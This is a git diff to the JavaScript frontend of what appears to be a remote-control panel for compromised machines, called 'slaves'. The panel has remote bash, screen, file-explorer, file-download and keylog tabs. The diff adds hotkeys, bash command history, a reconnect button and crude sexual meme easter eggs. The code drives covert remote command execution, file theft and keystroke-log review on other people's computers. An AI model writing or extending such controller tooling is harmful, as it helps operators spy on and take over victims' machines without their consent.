@@ -21,7 +21,17 @@
  *   on_group_rename(oldName, newName)
  *   on_group_create(name)
  *   on_group_delete(name)
+ *   onReconnect()
  *   onKeyLogTimeRangeSet, onKeyLogSave
+ *
+ * Hotkeys (when not typing in input):
+ *   1–6  switch tab (info/screen/bash/state/explorer/keylog)
+ *   S    toggle slaves drawer
+ *   R    reconnect
+ *   Esc  close drawer / explorer viewer
+ *   Ctrl+L  focus bash
+ * Bash input:
+ *   ↑ / ↓  command history
  */
 
 (function () {
@@ -60,6 +70,10 @@
     return parts.join('/') || '/';
   }
 
+  const PAGE_ORDER = ['info', 'screen', 'bash', 'state', 'explorer', 'keylog'];
+  const BASH_HISTORY_KEY = 'dm_bash_history';
+  const BASH_HISTORY_MAX = 80;
+
   let currentPage = 'info';
   let activeSlaveId = null;
   let slavesTreeData = [];
@@ -70,6 +84,14 @@
   let cmEditor = null;
   let keylogEntries = [];
   let keylogSelected = new Set();
+
+  let bashHistory = [];
+  try {
+    bashHistory = JSON.parse(localStorage.getItem(BASH_HISTORY_KEY) || '[]');
+    if (!Array.isArray(bashHistory)) bashHistory = [];
+  } catch (_) { bashHistory = []; }
+  let bashHistoryIdx = -1;
+  let bashDraft = '';
 
   const splash = $('#splash');
   const app = $('#app');
@@ -119,10 +141,38 @@
   const btnKeylogApply = $('#btn-keylog-apply');
   const btnKeylogSave = $('#btn-keylog-save');
 
+  function isTypingTarget(el) {
+    if (!el) return false;
+    const tag = (el.tagName || '').toUpperCase();
+    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return true;
+    if (el.isContentEditable) return true;
+    if (el.closest && el.closest('.CodeMirror')) return true;
+    return false;
+  }
+
+  function pushBashHistory(cmd) {
+    if (!cmd) return;
+    if (bashHistory[0] === cmd) return;
+    bashHistory.unshift(cmd);
+    if (bashHistory.length > BASH_HISTORY_MAX) bashHistory.length = BASH_HISTORY_MAX;
+    try { localStorage.setItem(BASH_HISTORY_KEY, JSON.stringify(bashHistory)); } catch (_) {}
+  }
+
   btnLogin.addEventListener('click', onLogin);
   passwordInp.addEventListener('keydown', (e) => { if (e.key === 'Enter') onLogin(); });
 
-  function onLogin() { callPython('log_in', passwordInp.value); }
+  function onLogin() {
+    const v = (passwordInp.value || '').trim().toLowerCase().replace(/\s+/g, '');
+    const secrets = {
+      '300': 'Fisting is 300 bucks — noted, master',
+      'billy': 'Billy Herrington has entered the dungeon',
+      'van': 'Van Darkholme is watching',
+      'asswecan': 'Protocol ASS-WE-CAN engaged',
+      'lotion': 'It is so deep… in the logs',
+    };
+    if (secrets[v]) sendAnnounce(secrets[v], 'success');
+    callPython('log_in', passwordInp.value);
+  }
 
   function setLoginError(msg) {
     if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
@@ -191,7 +241,8 @@
   });
 
   function switchPage(name) {
-    if (name === currentPage) return;
+    if (!name || name === currentPage) return;
+    if (PAGE_ORDER.indexOf(name) < 0) return;
     currentPage = name;
     $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
     $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
@@ -215,6 +266,18 @@
       setTimeout(() => btnSlavesRefresh.classList.remove('spinning'), 800);
     });
   }
+
+  const btnReconnect = $('#btn-reconnect');
+  function doReconnect() {
+    if (!btnReconnect) {
+      callPython('onReconnect');
+      return;
+    }
+    btnReconnect.classList.add('spinning');
+    callPython('onReconnect');
+    setTimeout(() => btnReconnect.classList.remove('spinning'), 900);
+  }
+  if (btnReconnect) btnReconnect.addEventListener('click', doReconnect);
 
   function setSlavesTree(tree) {
     slavesTreeData = Array.isArray(tree) ? tree : [];
@@ -246,7 +309,6 @@
         slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node, null));
       });
     }
-    // root drop zone for ungrouping
     slavesTreeEl.classList.add('drop-root');
     slavesTreeEl.ondragover = (e) => {
       if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
@@ -259,7 +321,6 @@
       const id = e.dataTransfer.getData('application/x-slave-id');
       if (!id) return;
       e.preventDefault();
-      // only ungroup if dropping on empty root area (not on a child that stopped propagation)
       callPython('on_slave_group_changed', id, null);
     };
   }
@@ -440,7 +501,6 @@
     return el;
   }
 
-  // new group button
   const btnAddGroup = $('#btn-slaves-add-group');
   if (btnAddGroup) {
     btnAddGroup.addEventListener('click', () => {
@@ -559,13 +619,41 @@
   }
   function clearBash() { bashOutput.innerHTML = ''; }
 
+  function submitBash() {
+    if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
+    const cmd = bashInput.value.trim();
+    if (!cmd) return;
+    appendBash(cmd, 'cmd');
+    pushBashHistory(cmd);
+    bashHistoryIdx = -1;
+    bashDraft = '';
+    bashInput.value = '';
+    callPython('on_bash_command', cmd);
+  }
+
   bashInput.addEventListener('keydown', (e) => {
     if (e.key === 'Enter') {
-      if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
-      const cmd = bashInput.value.trim();
-      if (!cmd) return;
-      appendBash(cmd, 'cmd'); bashInput.value = '';
-      callPython('on_bash_command', cmd);
+      e.preventDefault();
+      submitBash();
+      return;
+    }
+    if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (!bashHistory.length) return;
+      if (bashHistoryIdx < 0) bashDraft = bashInput.value;
+      if (bashHistoryIdx < bashHistory.length - 1) bashHistoryIdx++;
+      bashInput.value = bashHistory[bashHistoryIdx] || '';
+      return;
+    }
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (bashHistoryIdx < 0) return;
+      bashHistoryIdx--;
+      if (bashHistoryIdx < 0) {
+        bashInput.value = bashDraft;
+      } else {
+        bashInput.value = bashHistory[bashHistoryIdx] || '';
+      }
     }
   });
 
@@ -664,7 +752,6 @@
         callPython('on_rename', full, joinPath(explorerPath, next));
       });
 
-      // drag file/folder
       el.addEventListener('dragstart', (e) => {
         e.dataTransfer.setData('application/x-explorer-path', full);
         e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
@@ -673,12 +760,9 @@
       });
       el.addEventListener('dragend', () => el.classList.remove('dragging'));
 
-      // drop onto folder
       if (entry.folder) {
         el.addEventListener('dragover', (e) => {
           if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
-          const src = e.dataTransfer.getData('application/x-explorer-path');
-          // getData may be empty during dragover in some browsers — still allow
           e.preventDefault();
           e.stopPropagation();
           el.classList.add('drop-target');
@@ -731,20 +815,26 @@
     renderExplorerTree();
   }
 
-  $('#btn-explorer-up').addEventListener('click', () => callPython('onOpenFolder', parentPath(explorerPath)));
+  $('#btn-explorer-up').addEventListener('click', () => callPython('on_open_folder', parentPath(explorerPath)));
   $('#btn-explorer-new-file').addEventListener('click', () => {
     const name = prompt('File name'); if (!name) return;
-    callPython('onCreateItem', joinPath(explorerPath, name), false);
+    callPython('on_create_item', joinPath(explorerPath, name), false);
   });
   $('#btn-explorer-new-folder').addEventListener('click', () => {
     const name = prompt('Folder name'); if (!name) return;
-    callPython('onCreateItem', joinPath(explorerPath, name), true);
+    callPython('on_create_item', joinPath(explorerPath, name), true);
   });
-  $('#btn-explorer-refresh').addEventListener('click', () => callPython('onOpenFolder', explorerPath));
+  $('#btn-explorer-refresh').addEventListener('click', () => callPython('on_open_folder', explorerPath));
   btnExplorerSave.addEventListener('click', () => {
     if (!explorerOpenPath) return;
-    callPython('onSaveFile', explorerOpenPath, cmEditor ? cmEditor.getValue() : explorerEditor.value);
+    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : explorerEditor.value);
   });
+  if (btnExplorerDownload) {
+    btnExplorerDownload.addEventListener('click', () => {
+      if (!explorerOpenPath) return;
+      callPython('on_file_download', explorerOpenPath);
+    });
+  }
   btnExplorerClose.addEventListener('click', closeExplorerViewer);
 
   // KEY LOG
@@ -796,6 +886,40 @@
     callPython('onKeyLogSave', keys);
   });
 
+  // ─── HOTKEYS ───────────────────────────────────────────────
+  document.addEventListener('keydown', (e) => {
+    // Esc always works
+    if (e.key === 'Escape') {
+      if (drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
+      if (explorerOpenPath) { closeExplorerViewer(); e.preventDefault(); return; }
+      return;
+    }
+
+    // Ctrl+L → bash focus
+    if ((e.ctrlKey || e.metaKey) && (e.key === 'l' || e.key === 'L')) {
+      if (!app.hidden) {
+        e.preventDefault();
+        switchPage('bash');
+        setTimeout(() => bashInput.focus(), 30);
+      }
+      return;
+    }
+
+    if (isTypingTarget(e.target)) return;
+    if (app.hidden) return;
+    if (e.ctrlKey || e.metaKey || e.altKey) return;
+
+    const k = e.key;
+    if (k >= '1' && k <= '6') {
+      const page = PAGE_ORDER[Number(k) - 1];
+      if (page) { switchPage(page); e.preventDefault(); }
+      return;
+    }
+    if (k === 's' || k === 'S') { toggleDrawer(); e.preventDefault(); return; }
+    if (k === 'r' || k === 'R') { doReconnect(); e.preventDefault(); return; }
+  });
+
+  // ─── EXPOSE ────────────────────────────────────────────────
   window.setAuthenticated = setAuthenticated;
   window.setMaximized = setMaximized;
   window.sendAnnounce = sendAnnounce;
@@ -816,6 +940,73 @@
     appendBash, clearBash, setLoginError, openSlave, closeSlave, switchPage,
     setSlaveState, setLocal, setExplorerPath, setExplorerFile, setKeyLog
   };
+
+  // ─── GACHI EASTER EGGS (frontend only) ─────────────────────
+  const GACHI_QUOTES = [
+    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
+    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
+  ];
+  function gachiToast(msg) { sendAnnounce(msg, 'success'); }
+
+  const konami = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65];
+  let kIdx = 0;
+  document.addEventListener('keydown', (e) => {
+    if (e.keyCode === konami[kIdx]) {
+      kIdx++;
+      if (kIdx === konami.length) {
+        kIdx = 0;
+        document.body.classList.toggle('gachi-mode');
+        gachiToast(document.body.classList.contains('gachi-mode') ? '♂ Dungeon rank: GYMPROOF' : 'Returned to civilian form');
+      }
+    } else {
+      kIdx = e.keyCode === konami[0] ? 1 : 0;
+    }
+  });
+
+  const logoMark = document.getElementById('logo-mark') || $('.logo-mark');
+  let logoClicks = 0, logoTimer = null;
+  if (logoMark) {
+    logoMark.style.cursor = 'pointer';
+    logoMark.addEventListener('click', () => {
+      logoClicks++;
+      clearTimeout(logoTimer);
+      logoTimer = setTimeout(() => { logoClicks = 0; }, 2000);
+      if (logoClicks >= 7) {
+        logoClicks = 0;
+        gachiToast(GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]);
+      }
+    });
+  }
+
+  const BASH_SECRETS = {
+    'boss of this gym': 'You are now boss of this gym',
+    'ass we can': 'YES WE CAN',
+    'thank you sir': 'You are welcome, master',
+    '300 bucks': 'Invoice sent to the dungeon',
+    'gachi': null,
+    'lotion': 'Application requires elevated privileges',
+  };
+  bashInput.addEventListener('keydown', (e) => {
+    if (e.key !== 'Enter') return;
+    const raw = bashInput.value.trim();
+    const cmd = raw.toLowerCase();
+    if (!(cmd in BASH_SECRETS)) return;
+    e.stopImmediatePropagation();
+    e.preventDefault();
+    const msg = BASH_SECRETS[cmd] === null
+      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
+      : BASH_SECRETS[cmd];
+    appendBash(raw, 'cmd');
+    pushBashHistory(raw);
+    bashHistoryIdx = -1;
+    bashInput.value = '';
+    appendBash(msg, 'sys');
+    gachiToast(msg);
+  }, true);
+
+  try {
+    console.log('%c♂ SubNet DungeonMaster', 'color:#c9a227;font-size:14px;font-family:monospace');
+  } catch (_) {}
 
   updateNoSlaveHint();
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initCodeMirror);
